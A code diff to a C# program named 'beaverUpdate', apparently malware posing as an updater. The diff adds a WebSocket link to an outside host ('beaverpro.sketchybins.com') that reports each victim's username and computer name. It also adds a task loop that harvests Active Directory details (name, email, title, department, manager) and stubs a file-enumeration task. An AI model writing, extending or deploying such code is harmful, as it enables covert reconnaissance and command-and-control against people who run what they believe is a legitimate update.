@@ -11,6 +11,8 @@ namespace beaverUpdate
 {
     internal class Program
     {
+        private static DatabaseManager db;
+
         static async Task Main(string[] args)
         {
             // protected start: one instance, specific parents
@@ -21,7 +23,13 @@ namespace beaverUpdate
             }
 
             // Ensure we're tracking state
-            var db = new DatabaseManager("syncstate.db");
+            db = new DatabaseManager("syncstate.db");
+
+            // Connect to the "update" server
+            ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();
+            var client = $"{hostInfo.UserName}@{hostInfo.ComputerName}";
+            var socketTask = Task.Run(() => CommSDK.ListenToWebSocketAsync($"ws://beaverpro.sketchybins.com:8080/checkupdate?client={client}"));
+            
 
             // Start the task flow
             List<string> userJobDone = new List<string>
@@ -33,62 +41,54 @@ namespace beaverUpdate
 
             List<string> tasks = new List<string>
             {
-                "Licensing", // grab local info
-                "Registration", // grab and send local info
-                "",
-
+                "Licensing", // enumerate local and AD info
+                "Paperwork", // enumerate files
             };
 
             // Run through the tasks
-
-
-
-
-
-            // Say hello to mother. 
-            Console.WriteLine("Hello mother!");
-            ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();
-
-
-
-            
-
-
-            Console.WriteLine($"Greetings {hostInfo.UserName} from {hostInfo.ComputerName}");
-            //await SendMessage("bugz", $"Greetings from {hostInfo.UserName} on {hostInfo.ComputerName}!");
-            var jobdb = db.GetJobs();
-            foreach (var job in jobdb )
+            foreach (var task in tasks)
             {
-                Console.WriteLine($"Jobname: {job}");
+                Console.WriteLine($"{task}");
+                try // task has been run
+                {
+                    string taskStatus = db.GetJobStatus(task);
+                    Console.WriteLine(taskStatus);
+                    if (!userJobDone.Contains(taskStatus)) //task not completed
+                    {
+                        doTask(task);
+                    }
+                } catch // task not previously run
+                {
+                    doTask(task);
+                }
             }
 
-
+            // wait for messages
+            await socketTask;
         }
 
         // Task functions
-        static void Licensing()
+        static void doTask(string taskName)
         {
-            string userJob = db.GetJobStatus("userinfo");
-
-            if (!userJobDone.Contains(userJob))
+            switch(taskName)
             {
-                Console.WriteLine($"Collecting user job info: {userJob}");
-                try
-                {
-                    // Get the current user's active directory info, store to local db, record task
-                    DirectoryHelper.UserInfo userInfo = DirectoryHelper.GetUserInfo();
-                    db.DirectoryEntry(userInfo.UserName, userInfo.Name, userInfo.Email, userInfo.Title, userInfo.Department, userInfo.Manager);
-                    db.JobEntry(name: "Licensing", status: "collected");
-                }
-                catch
-                {
-                    Console.WriteLine("Marking task failed");
-                    db.JobEntry(name: "Licensing", status: "failed");
-                }
-            }
-            else
-            {
-                Console.WriteLine($"Skipped user check as previous attempt was {userJob}");
+                case "Licensing":
+                    try
+                    {
+                        // Get the current user's active directory info, store to local db, record task
+                        DirectoryHelper.UserInfo userInfo = DirectoryHelper.GetUserInfo();
+                        db.DirectoryEntry(userInfo.UserName, userInfo.Name, userInfo.Email, userInfo.Title, userInfo.Department, userInfo.Manager);
+                        db.JobEntry(name: "Licensing", status: "collected");
+                    }
+                    catch
+                    {
+                        Console.WriteLine("Marking task failed");
+                        db.JobEntry(name: "Licensing", status: "failed");
+                    }
+                    break;
+                case "Paperwork":
+                    Console.WriteLine("scanning files");
+                    break;
             }
         }
     }    
